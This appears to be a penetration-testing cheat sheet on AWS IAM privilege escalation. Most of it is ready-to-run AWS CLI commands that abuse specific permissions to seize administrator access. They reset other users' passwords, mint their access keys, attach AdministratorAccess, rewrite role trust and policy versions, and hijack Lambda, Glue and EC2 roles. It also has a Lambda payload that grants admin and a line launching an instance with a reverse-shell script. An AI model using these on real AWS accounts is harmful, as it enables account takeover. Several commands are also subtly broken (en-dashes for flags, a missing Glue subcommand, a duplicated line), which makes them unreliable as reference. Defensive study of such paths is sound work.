# AWS - Identity & Access Management

## AWS - Shadow Admin 

### Admin equivalent permission 

- AdministratorAccess

    ```powershell
    "Action": "*"
    "Resource": "*"
    ```

- **ec2:AssociateIamInstanceProfile** : attach an IAM instance profile to an EC2 instance
    ```powershell
    aws ec2 associate-iam-instance-profile --iam-instance-profile Name=admin-role --instance-id i-0123456789
    ```

- **iam:CreateAccessKey** : create a new access key to another IAM admin account
    ```powershell
    aws iam create-access-key –user-name target_user
    ```

- **iam:CreateLoginProfile** : add a new password-based login profile, set a new password for an entity and impersonate it 
    ```powershell
    $ aws iam create-login-profile –user-name target_user –password '|[3rxYGGl3@`~68)O{,-$1B”zKejZZ.X1;6T}<XT5isoE=LB2L^G@{uK>f;/CQQeXSo>}th)KZ7v?\\hq.#@dh49″=fT;|,lyTKOLG7J[qH$LV5U<9`O~Z”,jJ[iT-D^(' –no-password-reset-required
    ```

- **iam:UpdateLoginProfile** : reset other IAM users’ login passwords.
    ```powershell
    $ aws iam update-login-profile –user-name target_user –password '|[3rxYGGl3@`~68)O{,-$1B”zKejZZ.X1;6T}<XT5isoE=LB2L^G@{uK>f;/CQQeXSo>}th)KZ7v?\\hq.#@dh49″=fT;|,lyTKOLG7J[qH$LV5U<9`O~Z”,jJ[iT-D^(' –no-password-reset-required
    ```

- **iam:AttachUserPolicy**, **iam:AttachGroupPolicy** or **iam:AttachRolePolicy** : attach existing admin policy to any other entity he currently possesses
    ```powershell
    $ aws iam attach-user-policy –user-name my_username –policy-arn arn:aws:iam::aws:policy/AdministratorAccess
    $ aws iam attach-user-policy –user-name my_username –policy-arn arn:aws:iam::aws:policy/AdministratorAccess
    $ aws iam attach-role-policy –role-name role_i_can_assume –policy-arn arn:aws:iam::aws:policy/AdministratorAccess
    ```

- **iam:PutUserPolicy**, **iam:PutGroupPolicy** or **iam:PutRolePolicy** : added inline policy will allow the attacker to grant additional privileges to previously compromised entities.
    ```powershell
    $ aws iam put-user-policy –user-name my_username –policy-name my_inline_policy –policy-document file://path/to/administrator/policy.json
    ```

- **iam:CreatePolicy** : add a stealthy admin policy
- **iam:AddUserToGroup** : add into the admin group of the organization.
    ```powershell
    $ aws iam add-user-to-group –group-name target_group –user-name my_username
    ```

- **iam:UpdateAssumeRolePolicy** + **sts:AssumeRole** : change the assuming permissions of a privileged role and then assume it with a non-privileged account.
    ```powershell
    $ aws iam update-assume-role-policy –role-name role_i_can_assume –policy-document file://path/to/assume/role/policy.json
    ```

- **iam:CreatePolicyVersion** & **iam:SetDefaultPolicyVersion** : change customer-managed policies and change a non-privileged entity to be a privileged one.
    ```powershell
    $ aws iam create-policy-version –policy-arn target_policy_arn –policy-document file://path/to/administrator/policy.json –set-as-default
    $ aws iam set-default-policy-version –policy-arn target_policy_arn –version-id v2
    ```

- **lambda:UpdateFunctionCode** : give an attacker access to the privileges associated with the Lambda service role that is attached to that function.
    ```powershell
    $ aws lambda update-function-code –function-name target_function –zip-file fileb://my/lambda/code/zipped.zip
    ```

- **glue:UpdateDevEndpoint** : give an attacker access to the privileges associated with the role attached to the specific Glue development endpoint.
    ```powershell
    $ aws glue –endpoint-name target_endpoint –public-key file://path/to/my/public/ssh/key.pub
    ```


- **iam:PassRole** + **ec2:CreateInstanceProfile**/**ec2:AddRoleToInstanceProfile** : an attacker could create a new privileged instance profile and attach it to a compromised EC2 instance that he possesses.

- **iam:PassRole** + **ec2:RunInstance** : give an attacker access to the set of permissions that the instance profile/role has, which again could range from no privilege escalation to full administrator access of the AWS account.
    ```powershell
    # add ssh key
    $ aws ec2 run-instances –image-id ami-a4dc46db –instance-type t2.micro –iam-instance-profile Name=iam-full-access-ip –key-name my_ssh_key –security-group-ids sg-123456
    # execute a reverse shell
    $ aws ec2 run-instances –image-id ami-a4dc46db –instance-type t2.micro –iam-instance-profile Name=iam-full-access-ip –user-data file://script/with/reverse/shell.sh
    ```

- **iam:PassRole** + **lambda:CreateFunction** + **lambda:InvokeFunction** : give a user access to the privileges associated with any Lambda service role that exists in the account.
    ```powershell
    $ aws lambda create-function –function-name my_function –runtime python3.6 –role arn_of_lambda_role –handler lambda_function.lambda_handler –code file://my/python/code.py
    $ aws lambda invoke –function-name my_function output.txt
    ```
    Example of code.py
    ```python
    import boto3
    def lambda_handler(event, context):
        client = boto3.client('iam')
        response = client.attach_user_policy(
        UserName='my_username',
        PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess"
        )
        return response
    ```

* **iam:PassRole** + **glue:CreateDevEndpoint** : access to the privileges associated with any Glue service role that exists in the account.
    ```powershell
    $ aws glue create-dev-endpoint –endpoint-name my_dev_endpoint –role-arn arn_of_glue_service_role –public-key file://path/to/my/public/ssh/key.pub
    ```



## References

* [Cloud Shadow Admin Threat 10 Permissions Protect - CyberArk](https://www.cyberark.com/threat-research-blog/cloud-shadow-admin-threat-10-permissions-protect/)